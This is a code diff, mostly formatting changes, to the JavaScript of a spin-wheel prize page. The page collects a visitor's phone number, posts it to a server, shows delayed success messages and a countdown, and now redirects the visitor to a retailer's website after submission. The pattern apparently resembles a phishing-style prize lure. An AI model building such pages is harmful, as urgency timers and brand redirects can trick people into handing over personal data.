@@ -75,7 +75,7 @@ document.getElementById('sdt').addEventListener('change', function () {
         openThongbao(4);
 
     }
-    
+
 
 });
 
@@ -89,7 +89,7 @@ function checksdt() {
 function sendData() {
     let sdt = document.getElementById("sdt").value;
 
-    fetch("http://"+serverPath+"/submit", {
+    fetch("http://" + serverPath + "/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ sdt: sdt })
@@ -97,25 +97,25 @@ function sendData() {
     })
         .then(response => response.json())
         .then(data => {
-            // console.log(data.user)
-            if (data.user) {
+            // console.log(data.status)
+            if (data.sdt) {
                 setTimeout(function () {
                     openThongbao(2);
                     document.getElementById('sdt').disabled = true;
                     document.getElementById('getPrize').disabled = true;
-                    document.getElementById('getPrize').innerText = 'Thành Công';
                     document.getElementById('getPrize').style.backgroundColor = '#2a83e9';
-                }, 5000);
+                    document.getElementById('getPrize').innerText = 'Thành Công';
+                    reloadPage(5); // reload trang sau 5 giây
 
+                }, 5000);
 
                 // resetPopup();
             } else {
                 setTimeout(function () {
                     openThongbao(3);
                 }, 5000);
-
             }
-            
+
         }
 
         )
@@ -152,7 +152,7 @@ function startProgress() {
         progressBar.style.width = width + "%";
         progressBar.setAttribute("aria-valuenow", width);
     }, intervalTime);
-    
+
 }
 
 function openThongbao(thongbao) {
@@ -186,7 +186,7 @@ function openThongbao(thongbao) {
             document.getElementById('thongbao_3').classList.add('d-none');
             document.getElementById('thongbao_4').classList.remove('d-none');
             document.getElementById('getPrize').disabled = true;
-        break;
+            break;
     }
     document.getElementById("progressBarWrap").classList.add("d-none");
 
@@ -215,15 +215,15 @@ function EndSpinwheel() {
 
 
 // countdown
- 
 
- let timeLeft = 16 * 60 * 60; 
- let countdownDiv = document.getElementById("countDown");
- let spanH = document.getElementById("hours");
- let spanM = document.getElementById("minutes");
- let spanS = document.getElementById("seconds");
 
- function countdownToDate(targetDate) {
+let timeLeft = 16 * 60 * 60;
+let countdownDiv = document.getElementById("countDown");
+let spanH = document.getElementById("hours");
+let spanM = document.getElementById("minutes");
+let spanS = document.getElementById("seconds");
+
+function countdownToDate(targetDate) {
     function updateCountdown() {
         let now = new Date().getTime();
         let distance = targetDate - now;
@@ -238,10 +238,10 @@ function EndSpinwheel() {
         let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
         let seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-        spanH.textContent = totalHours < 10 ? "0" + totalHours : totalHours ;
-        spanM.textContent = minutes < 10 ? "0" + minutes : minutes  ;   
-        spanS.textContent = seconds <10 ? "0" + seconds : seconds ;
-       
+        spanH.textContent = totalHours < 10 ? "0" + totalHours : totalHours;
+        spanM.textContent = minutes < 10 ? "0" + minutes : minutes;
+        spanS.textContent = seconds < 10 ? "0" + seconds : seconds;
+
     }
 
     updateCountdown(); // Cập nhật lần đầu tiên
@@ -255,12 +255,19 @@ countdownToDate(targetDate);
 
 //slideshow
 let slides = document.querySelectorAll('.slide');
-        let currentSlide = 0;
+let currentSlide = 0;
 
-        function changeSlide() {
-            slides[currentSlide].classList.add('hidden'); 
-            currentSlide = (currentSlide + 1) % slides.length; 
-            slides[currentSlide].classList.remove('hidden'); 
-        }
+function changeSlide() {
+    slides[currentSlide].classList.add('hidden');
+    currentSlide = (currentSlide + 1) % slides.length;
+    slides[currentSlide].classList.remove('hidden');
+}
 
-        setInterval(changeSlide, 3000); // Chuyển slide mỗi 3 giây
+setInterval(changeSlide, 3000); // Chuyển slide mỗi 3 giây
+
+
+function reloadPage(seconds) {
+    setTimeout(function () {
+        window.location.href = 'https://www.dienmayxanh.com/';
+    }, seconds*1000);
+}
